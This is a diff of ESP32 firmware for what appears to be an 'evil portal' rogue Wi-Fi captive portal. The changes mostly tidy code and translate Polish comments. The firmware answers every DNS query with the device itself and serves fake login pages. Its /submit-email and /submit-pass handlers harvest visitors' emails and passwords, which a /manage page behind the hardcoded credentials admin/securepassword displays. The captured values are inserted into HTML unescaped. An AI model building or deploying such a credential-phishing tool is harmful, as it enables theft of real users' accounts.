@@ -28,6 +28,7 @@ String CredentialList;
 String email;
 String pass;
 
+// Credentials for manage.html //////////////////////////////////////////////////////////
 const char* http_username = "admin";
 const char* http_password = "securepassword";
 
@@ -36,10 +37,17 @@ void checkCredentials(AsyncWebServerRequest *request) {
     request->requestAuthentication();
   }
 }
+/////////////////////////////////////////////////////////////////////////////////////////
 
+// Load SPIFFS files ////////////////////////////////////////////////////////////////////
 String loadFile(String path) {
+  if (!SPIFFS.exists(path)) {
+    Serial.println("File not found: " + path);
+    return "";
+  }
+
   File file = SPIFFS.open(path, "r");
-  if (!file) {
+  if (!file || file.isDirectory()) {
     Serial.println("Failed to open file: " + path);
     return "";
   }
@@ -48,7 +56,9 @@ String loadFile(String path) {
   file.close();
   return content;
 }
+/////////////////////////////////////////////////////////////////////////////////////////
 
+// Reset Device Handler /////////////////////////////////////////////////////////////////
 void handleResetDevice(AsyncWebServerRequest *request) {
   request->send(200, "text/html", "Resetting EEPROM and SSID...");
 
@@ -65,8 +75,9 @@ void handleResetDevice(AsyncWebServerRequest *request) {
   delay(1000); // Give the response time to be sent
   ESP.restart();
 }
+/////////////////////////////////////////////////////////////////////////////////////////
 
-//--------------------ZMIENIANIE SSID-----------------------//
+// Change SSID Handler //////////////////////////////////////////////////////////////////
 int h2int(char c);
 String urldecode(String input);
 
@@ -76,7 +87,7 @@ void handleSsidChange(AsyncWebServerRequest *request) {
     String newSsid = urldecode(newSsidEncoded);
     ssid = newSsid;
 
-    // Zapisz nowe SSID do pamięci EEPROM
+    // Save new SSID to EEPROM memory
     EEPROM.begin(512);
     EEPROM.put(EEPROM_SSID_ADDRESS, ssid);
     EEPROM.commit();
@@ -89,8 +100,9 @@ void handleSsidChange(AsyncWebServerRequest *request) {
     request->send(400, "text/html", "Bad Request");
   }
 }
+/////////////////////////////////////////////////////////////////////////////////////////
 
-// DEKODOWANIE SSID
+// DECODING SSID ////////////////////////////////////////////////////////////////////////
 String urldecode(String input) {
   String output = "";
   char c;
@@ -106,7 +118,7 @@ String urldecode(String input) {
   }
   return output;
 }
-// DEKODOWANIE SSID
+
 int h2int(char c) {
   if (c >= '0' && c <='9')
     return (c - '0');
@@ -116,13 +128,15 @@ int h2int(char c) {
     return (c - 'A' + 10);
   return 0;
 }
-//----------------------------------------------------//
+/////////////////////////////////////////////////////////////////////////////////////////
 
+// Restart ESP32 handler ////////////////////////////////////////////////////////////////
 void handleRestartDevice(AsyncWebServerRequest *request) {
   request->send(200, "text/html", "Restarting device...");
   delay(1000); // Give the response time to be sent
   ESP.restart();
 }
+/////////////////////////////////////////////////////////////////////////////////////////
 
 void setUpDNSServer(DNSServer &dnsServer, const IPAddress &localIP) {
 #define DNS_INTERVAL 30
@@ -157,56 +171,7 @@ void setUpWebserver(AsyncWebServer &server, const IPAddress &localIP) {
 
     server.on("/favicon.ico", [](AsyncWebServerRequest *request) { request->send(404); });
 
-	// LOADING FONTS AND STYLES
-    server.on("/style.css", HTTP_ANY, [](AsyncWebServerRequest *request) {
-        String content = loadFile("/style.css");
-        AsyncWebServerResponse *response = request->beginResponse(200, "text/css", content);
-        response->addHeader("Cache-Control", "public,max-age=31536000");
-        request->send(response);
-        Serial.println("Served CSS Style Sheet");
-    });
-
-	server.on("/style2.css", HTTP_ANY, [](AsyncWebServerRequest *request) {
-        String content = loadFile("/style2.css");
-        AsyncWebServerResponse *response = request->beginResponse(200, "text/css", content);
-        response->addHeader("Cache-Control", "public,max-age=31536000");
-        request->send(response);
-        Serial.println("Served CSS Style Sheet");
-    });
-
-	// server.on("/css/googleSans.css", HTTP_ANY, [](AsyncWebServerRequest *request) {
-  //       String content = loadFile("/css/googleSans.css");
-  //       AsyncWebServerResponse *response = request->beginResponse(200, "text/css", content);
-  //       response->addHeader("Cache-Control", "public,max-age=31536000");
-  //       request->send(response);
-  //       Serial.println("Served CSS Style Sheet");
-  //   });
-	// THIS FONTS NOT WORKING!!! IDK WHY
-	// server.on("/css/medium.ttf", HTTP_ANY, [](AsyncWebServerRequest *request) {
-  //   String content = loadFile("/css/medium.ttf");
-  //   AsyncWebServerResponse *response = request->beginResponse(200, "application/font-ttf", content);
-  //   response->addHeader("Cache-Control", "public,max-age=31536000");
-  //   request->send(response);
-  //   Serial.println("Served Font File");
-	// });
-	
-	// server.on("/css/regular.ttf", HTTP_ANY, [](AsyncWebServerRequest *request) {
-  //       String content = loadFile("/css/regular.ttf");
-  //       AsyncWebServerResponse *response = request->beginResponse(200, "application/font-ttf", content);
-  //       response->addHeader("Cache-Control", "public,max-age=31536000");
-  //       request->send(response);
-  //       Serial.println("Served TTF Font");
-  //   });
-
-	// server.on("/css/roboto.ttf", HTTP_ANY, [](AsyncWebServerRequest *request) {
-  //       String content = loadFile("/css/roboto.ttf");
-  //       AsyncWebServerResponse *response = request->beginResponse(200, "application/font-ttf", content);
-  //       response->addHeader("Cache-Control", "public,max-age=31536000");
-  //       request->send(response);
-  //       Serial.println("Served TTF Font");
-  //   });
-
-	//LOADING HTML PAGES
+	// Loading frontend pages /////////////////////////////////////////////////////////////
   server.on("/", HTTP_ANY, [](AsyncWebServerRequest *request) {
     String content = loadFile("/index.html");
     AsyncWebServerResponse *response = request->beginResponse(200, "text/html", content);
@@ -214,16 +179,6 @@ void setUpWebserver(AsyncWebServer &server, const IPAddress &localIP) {
     request->send(response);
     Serial.println("Served Basic HTML Page");
   	});
-
-  server.on("/manage", HTTP_ANY, [](AsyncWebServerRequest *request) {
-    checkCredentials(request);
-    String dynamicManageHTML = loadFile("/manage.html");
-    dynamicManageHTML.replace("%CREDENTIALS%", CredentialList);
-    AsyncWebServerResponse *response = request->beginResponse(200, "text/html", dynamicManageHTML);
-    response->addHeader("Cache-Control", "public,max-age=31536000");
-    request->send(response);
-    Serial.println("Served Manage HTML Page");
-  });
 
   server.on("/login", HTTP_ANY, [](AsyncWebServerRequest *request) {
     String content = loadFile("/login.html");
@@ -240,45 +195,77 @@ void setUpWebserver(AsyncWebServer &server, const IPAddress &localIP) {
     request->send(response);
     Serial.println("Served login HTML Page");
   });
+  ///////////////////////////////////////////////////////////////////////////////////////
 
+  // Loading CSS styles /////////////////////////////////////////////////////////////////
+  server.on("/style.css", HTTP_ANY, [](AsyncWebServerRequest *request) {
+        String content = loadFile("/style.css");
+        AsyncWebServerResponse *response = request->beginResponse(200, "text/css", content);
+        response->addHeader("Cache-Control", "public,max-age=31536000");
+        request->send(response);
+        Serial.println("Served CSS Style Sheet");
+    });
+
+	server.on("/style2.css", HTTP_ANY, [](AsyncWebServerRequest *request) {
+        String content = loadFile("/style2.css");
+        AsyncWebServerResponse *response = request->beginResponse(200, "text/css", content);
+        response->addHeader("Cache-Control", "public,max-age=31536000");
+        request->send(response);
+        Serial.println("Served CSS Style Sheet");
+    });
+
+  ///////////////////////////////////////////////////////////////////////////////////////
+
+  // Loading backend page ///////////////////////////////////////////////////////////////
+  server.on("/manage", HTTP_ANY, [](AsyncWebServerRequest *request) {
+    checkCredentials(request);
+    String dynamicManageHTML = loadFile("/manage.html");
+    dynamicManageHTML.replace("%CREDENTIALS%", CredentialList);
+    AsyncWebServerResponse *response = request->beginResponse(200, "text/html", dynamicManageHTML);
+    response->addHeader("Cache-Control", "public,max-age=31536000");
+    request->send(response);
+    Serial.println("Served Manage HTML Page");
+  });
+
+  // Loading backend actions ////////////////////////////////////////////////////////////
 	server.on("/change-ssid", HTTP_POST, handleSsidChange);
 
 	server.on("/restart-device", HTTP_POST, handleRestartDevice);
 
 	server.on("/reset-device", HTTP_POST, handleResetDevice);
+  ///////////////////////////////////////////////////////////////////////////////////////
 
-    // New handler for submitting email
-    server.on("/submit-email", HTTP_POST, [](AsyncWebServerRequest *request) {
-    if (request->hasParam("email", true)) {
-        email = request->getParam("email", true)->value();
+  // Handler for submitting email ///////////////////////////////////////////////////////
+  server.on("/submit-email", HTTP_POST, [](AsyncWebServerRequest *request) {
+  if (request->hasParam("email", true)) {
+      email = request->getParam("email", true)->value();
 
-        // You can store, display, or process email and pass as needed
-        CredentialList += "Email: <div style='background-color:" + email + "; padding: 10px; margin: 5px;'>" + email + "</div>";
+      // You can store, display, or process email and pass as needed
+      CredentialList += "Email: <div style='background-color:" + email + "; padding: 10px; margin: 5px;'>" + email + "</div>";
 
-        request->redirect("/login"); // Redirect back to the pass page after submitting email
+      request->redirect("/login"); // Redirect to the pass page after submitting email
+  }
+  });
+  // Handler for submitting password ////////////////////////////////////////////////////
+  server.on("/submit-pass", HTTP_POST, [](AsyncWebServerRequest *request) {
+  if (request->hasParam("pass", true)) {
+      pass = request->getParam("pass", true)->value();
+
+		  // You can store, display, or process email and pass as needed
+		  CredentialList += "Password: <div style='background-color:" + pass + "; padding: 10px; margin: 5px;'>" + pass + "<hr></div>";
+
+      request->redirect("/blank"); // Redirect to the blank page after submitting pass
     }
-
-});
-    // New handler for submitting pass
-    server.on("/submit-pass", HTTP_POST, [](AsyncWebServerRequest *request) {
-    if (request->hasParam("pass", true)) {
-        pass = request->getParam("pass", true)->value();
-
-		// You can store, display, or process email and pass as needed
-		CredentialList += "Password: <div style='background-color:" + pass + "; padding: 10px; margin: 5px;'>" + pass + "<hr></div>";
-
-        request->redirect("/blank"); // Redirect back to the blank page after submitting pass
-    }
-});
-
-    server.onNotFound([](AsyncWebServerRequest *request) {
-        request->redirect(localIPURL);
-        Serial.print("onnotfound ");
-        Serial.print(request->host());
-        Serial.print(" ");
-        Serial.print(request->url());
-        Serial.print(" sent redirect to " + localIPURL + "\n");
-    });
+  });
+  ///////////////////////////////////////////////////////////////////////////////////////
+  server.onNotFound([](AsyncWebServerRequest *request) {
+      request->redirect(localIPURL);
+      Serial.print("onnotfound ");
+      Serial.print(request->host());
+      Serial.print(" ");
+      Serial.print(request->url());
+      Serial.print(" sent redirect to " + localIPURL + "\n");
+  });
 }
 
 void setup() {
@@ -288,14 +275,18 @@ void setup() {
     while (!Serial)
         ;
 
-	if (!SPIFFS.begin()) {
-    Serial.println("Failed to mount file system");
-    return;
-  }
+    // CHECK SPIFFS mount files /////////////////////////////////////////////////////////
+    if (!SPIFFS.begin()) {
+      Serial.println("Failed to mount file system");
+      return;
+    }
+    /////////////////////////////////////////////////////////////////////////////////////
 
-	EEPROM.begin(512);
-	EEPROM.get(EEPROM_SSID_ADDRESS, ssid);
-	EEPROM.end();
+    // WRITE SSID TO EEPROM memory //////////////////////////////////////////////////////
+    EEPROM.begin(512);
+    EEPROM.get(EEPROM_SSID_ADDRESS, ssid);
+    EEPROM.end();
+    /////////////////////////////////////////////////////////////////////////////////////
 
     Serial.println("\n\nCaptive Test, V0.5.0 compiled " __DATE__ " " __TIME__ " by CD_FER");
     Serial.printf("%s-%d\n\r", ESP.getChipModel(), ESP.getChipRevision());
